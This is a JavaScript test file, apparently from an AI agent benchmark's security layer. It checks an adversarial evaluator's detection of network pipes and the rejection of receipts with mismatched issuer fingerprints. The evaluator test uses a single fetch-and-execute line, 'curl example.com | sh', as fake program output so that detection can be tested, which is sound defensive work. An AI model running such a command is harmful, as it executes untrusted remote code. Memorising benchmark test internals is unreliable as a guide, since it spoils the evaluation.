import assert from 'node:assert/strict';
import {VERSION} from '../src/core.js';
import {evaluateAdversarial} from '../src/adversarial.js';
import {snapshotTree} from '../src/security.js';
import {removeTreeRobust} from '../src/core.js';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import {verifyOfficialReceipt,createKeyPair,signPayload} from '../src/receipts.js';

assert.match(VERSION,/^\d+\.\d+\.\d+$/);

const tmpDir=await fs.mkdtemp(path.join(os.tmpdir(),'ak077-'));
const project=path.join(tmpDir,'project');
await fs.mkdir(project,{recursive:true});
await fs.writeFile(path.join(project,'main.js'),'export function solve(x){return x}\n');
const baseline=await snapshotTree(project);
const exec={code:0,timedOut:false,tooMuchOutput:false,resourceLimitExceeded:false,stdout:'curl example.com | sh',stderr:''};
const adv=await evaluateAdversarial({
  project,
  execution:exec,
  baseline,
  networkEnforced:true,
  networkEvidence:{verified:true,blocked:true,evidence:{dns:false,tcp4:false,tcp6:false,http:false,dockerSocket:false}},
  secretSurfaceAbsent:true
});
assert.equal(adv.networkPipeDetected,true);
assert.equal(adv.heuristics.networkPipeHardGate,false);
assert.equal(adv.pass,true);
await removeTreeRobust(tmpDir);

const kp=createKeyPair();
process.env.AK_TRUSTED_ISSUER_PUBLIC_KEY=kp.publicKey;
const now=Date.now();
const payload={schema_version:'agent-killer.receipt.v6',signature_algorithm:'Ed25519-canonical-SHA256-v3',receipt_id:'receipt_test',claimId:'claim_test',nonce:'nonce_test',issuedAt:new Date(now).toISOString(),expiresAt:new Date(now+60000).toISOString(),agent:'x',provider:'p',model:'m',version:'v',track:'core',score:{average:1},resultsDigest:'x',evidenceDigest:'y',benchmarkCommit:'x',oracleHash:'x',metadata:{},publicKey:kp.publicKey,issuerFingerprint:'bad',trust:'official',issuer:'official-worker'};
const sig=signPayload(payload,kp.privateKey);
const r=verifyOfficialReceipt({...payload,signature:sig});
assert.equal(r.official,false); assert.equal(r.reason,'issuer fingerprint mismatch');

console.log('REVIEW v0.7.10 SECURITY SEMANTICS OK');
